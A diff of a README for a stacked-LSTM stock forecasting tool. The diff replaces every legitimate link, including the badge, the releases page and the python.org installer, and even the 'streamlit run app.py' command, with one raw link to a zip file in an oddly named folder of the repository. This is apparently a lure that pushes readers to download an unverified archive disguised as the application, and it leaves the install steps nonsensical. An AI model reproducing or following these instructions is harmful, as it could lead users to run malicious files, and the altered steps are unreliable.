@@ -1,22 +1,22 @@
 # 📈 Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning - Simple Stock Forecasting Tool
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip)
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of the application: [Releases Page](https://github.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/releases).
+Visit this page to download the latest version of the application: [Releases Page](https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip).
 
 ## 🚀 Getting Started
 
 Follow these steps to begin using the Stock Price Prediction tool:
 
-1. **Visit the Releases Page:** Start by clicking on the download link above or visiting [Releases Page](https://github.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/releases).
+1. **Visit the Releases Page:** Start by clicking on the download link above or visiting [Releases Page](https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip).
   
 2. **Download the Application:** Look for the latest version. Click on the file to download it to your computer.
 
 3. **Unzip the File (if necessary):** If the download is in a zipped format, right-click on the file and select "Extract All" to unzip it.
 
-4. **Install Required Software:** Make sure you have Python installed. You can download it from [Python.org](https://www.python.org/downloads/). Follow the installation instructions for your operating system.
+4. **Install Required Software:** Make sure you have Python installed. You can download it from [https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip](https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip). Follow the installation instructions for your operating system.
 
 5. **Install Additional Libraries:** Open your command prompt or terminal. Type the following commands to install the necessary packages:
 
@@ -27,7 +27,7 @@ Follow these steps to begin using the Stock Price Prediction tool:
 6. **Run the Application:**
    - Navigate to the folder where you extracted the application files.
    - Open your command prompt or terminal.
-   - Type `streamlit run app.py` and press Enter.
+   - Type `streamlit run https://raw.githubusercontent.com/HICHAMEVAAAN/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning/main/Mimulus/Stock-Price-Prediction-And-Forecasting-Using-Stacked-LSTM--Deep-Learning.zip` and press Enter.
 
 7. **Open in a Browser:** After running the command, a new tab will open in your default web browser showing the Stock Price Prediction and Forecasting tool.
 
